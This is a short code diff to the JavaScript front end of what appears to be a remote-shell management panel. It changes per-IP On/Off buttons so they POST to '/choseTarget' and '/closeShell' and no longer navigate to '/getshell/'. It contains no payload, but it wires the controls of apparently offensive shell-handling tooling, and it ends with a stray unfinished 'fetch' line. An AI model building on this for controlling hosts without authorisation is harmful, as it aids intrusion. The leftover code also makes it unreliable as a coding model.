@@ -53,17 +53,29 @@ function updateConnections() {
           statusButton.style.backgroundColor = "rgba(255, 0, 0, 0.415)";
         }
 
-        statusButton.onclick = function () {
+        statusButton.onclick = async function () {
           if (statusButton.textContent === "Off") {
             statusButton.textContent = "On";
             statusButton.style.backgroundColor = "green";
-        
-            // Navigate to the new URL in the same window
-            window.location.href = '/getshell/' + ip;
+            fetch("/choseTarget", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({ ip: ip })
+            })
+
           } else {
+            await fetch("/closeShell", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({ ip: ip })
+            });
             statusButton.textContent = "Off";
             statusButton.style.backgroundColor = "rgba(255, 0, 0, 0.415)";
-            // Call a function to disconnect the host
+            fetch
           }
         };
       
